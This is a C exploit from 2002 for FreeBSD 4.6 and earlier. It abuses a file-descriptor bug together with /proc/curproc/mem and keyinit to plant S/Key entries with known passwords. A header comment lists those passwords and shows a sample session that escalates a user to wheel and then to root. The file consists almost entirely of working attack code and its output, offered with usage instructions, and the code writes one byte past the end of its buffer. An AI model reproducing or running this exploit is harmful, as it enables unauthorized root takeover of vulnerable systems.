/*
*
* Systems affected: FreeBSD <= 4.6               
*
* Credit:
* ----------------------------------------------
* Advisory:
* http://www.guninski.com/freebsd2.html
*
* -----------------------------------------------
*
* Skey stuffage:
* -----------------------------------------------
* phased/b10z
* phased@snosoft.com
*
* this program makes the following skeys valid
*
* 95: CARE LIVE CARD LOFT CHIC HILL
* 96: TESS OIL WELD DUD MUTE KIT
* 97: DADE BED DRY JAW GRAB NOV
* 98: MASS OAT ROLL TOOL AGO CAM
* 99: DARK LEW JOLT JIVE MOS WHO
*
* -------------------------------------------------
*
* This will allow you to su to any user.
*
* [nocon] > id
* uid=1002(nocon) gid=1002(nocon) groups=1002(nocon)
* [nocon] > grep wheel /etc/group
* wheel:*:0:root,stpstone
* [nocon] > /tmp/iosmash2 stpstone 
* Adding nocon:
* <--- HIT CTRL-C --->
* [nocon] > su stpstone
* s/key 98 iosmash2 
* Password: MASS OAT ROLL TOOL AGO CAM
* [nocon]: id
* uid=1001(stpstone) gid=1001(stpstone) groups=1001(stpstone), 0(wheel)
* [nocon]: /tmp/iosmash2 root
* Adding stpstone:
* <--- HIT CTRL-C --->
* [nocon]: su 
* s/key 98 iosmash2
* Password: MASS OAT ROLL TOOL AGO CAM
* [nocon]# id
* uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
* [nocon]#
*
*
* - noconflic
* 31 July 2002
*
*/

#include <stdio.h>
#include <fcntl.h>

int main(int argc,char *argv[])
{

FILE * f;

char skey[] = {" 0099 iosmash2 6f648e8bd0e2988a Apr 23,2666 01:02:03\n"};
char *user;
char buff[100];

          if (argc != 2) { 
           printf("------------------------------------------------\n");
           printf("FreeBSD <= 4.6 kernal file descriptor exploit\n-noconflic\n");
           printf("------------------------------------------------\n");
           printf("Usage: %s <username>\n",argv[0]); 
           exit(1);  
          } 

user = argv[1];

  strcpy(buff,"\n");
  strcat(buff,user);
  strcat(buff,skey);
  buff[100] = '\0';

while( ((int )f=dup(1)) != -1);

         close(2); 
         close(3); 

  (int )f=open("/proc/curproc/mem",O_WRONLY);

        if ((int )f==-1) fprintf(stdout,"Error in open /proc\n");

      execl("/usr/bin/keyinit",buff,0);                                    

return(0);
}
